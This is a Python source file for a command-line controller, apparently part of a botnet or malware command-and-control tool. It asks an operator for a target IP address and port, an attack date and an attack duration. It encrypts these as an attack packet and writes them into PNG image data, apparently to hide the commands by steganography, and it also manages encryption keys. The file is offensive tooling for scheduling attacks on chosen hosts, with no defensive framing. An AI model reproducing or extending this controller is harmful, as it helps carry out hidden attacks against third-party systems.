from app.models import singleton, PacketData
from app.utils import PngUtils
from app.tasks.encrypt import Encrypt
import re


@singleton
class PacketCli:
    def __init__(self):
        self.packetData = PacketData()
        self.pngUtils = PngUtils()
        self.encrypt = Encrypt()

    def cliPrint(self):
        while True:
            try:
                flag = input(
                    "[Terminal] Enter Flag Num\n(0: empty, 1: attack, 2: key, 3: cancle, x: back): "
                )
                if flag == "x":
                    break
                self.packetData.flag = int(flag.strip())
                if 0 <= self.packetData.flag <= 3:
                    if self.packetData.flag == 1:
                        self.setAttack()
                        self.packetData.encryptedToken = self.encrypt.encrypt(
                            self.packetData.getBytes()
                        )
                    elif self.packetData.flag == 2:
                        self.setKey()
                    else:
                        self.packetData.clear(clearFlag=False)

                    self.packetData.printPacket()

                    self.pngUtils.cleanPNGData()
                    if self.packetData.flag != 0:
                        self.pngUtils.writePNGData(self.packetData)
                    break
                else:
                    print(f"Enter Number Between 0 ~ 3")
            except ValueError:
                print("Enter Number Only")

    def setAttack(self):
        step = 0
        while True:
            try:
                if step == 0:
                    addrPattern = r"^\d+\.\d+\.\d+\.\d+:\d+$"
                    addr = input(
                        "[Terminal] Enter IP Address and Port Num(ex: 127.0.0.1:9999): "
                    )
                    if re.match(addrPattern, addr):
                        ip, port = addr.strip().split(":")
                        self.packetData.ipAddr = list(map(int, ip.split(".")))
                        self.packetData.portNum = int(port)
                        step += 1
                    else:
                        print("Invalid Pattern")
                if step == 1:
                    datePattern = r"^\d+:\d+:\d+$"
                    date = input("[Terminal] Enter Attack Date(ex: 1:23:4): ")
                    if re.match(datePattern, date):
                        self.packetData.atkDate = list(
                            map(int, date.strip().split(":"))
                        )
                        step += 1
                    else:
                        print("Invalid Pattern")

                if step == 2:
                    duration = input("[Terminal] Enter Attack Duration(0~31): ")
                    duration = int(duration)
                    if 0 <= duration <= 31:
                        self.packetData.atkDuration = duration
                        step += 1
                    else:
                        print("Enter Duration Between 0 ~ 31")

                if step == 3:
                    break
            except ValueError:
                print("Invalid Value")

    def setKey(self):
        while True:
            c = input("[Terminal] Use latest key? (Y/N): ").strip().lower()
            if c == "y":
                self.packetData.decryptKey = self.encrypt.key
                break
            elif c == "n":
                self.encrypt.createKey()
                self.packetData.decryptKey = self.encrypt.key
                break
            else:
                print("Invalid input. Please enter Y or N.")
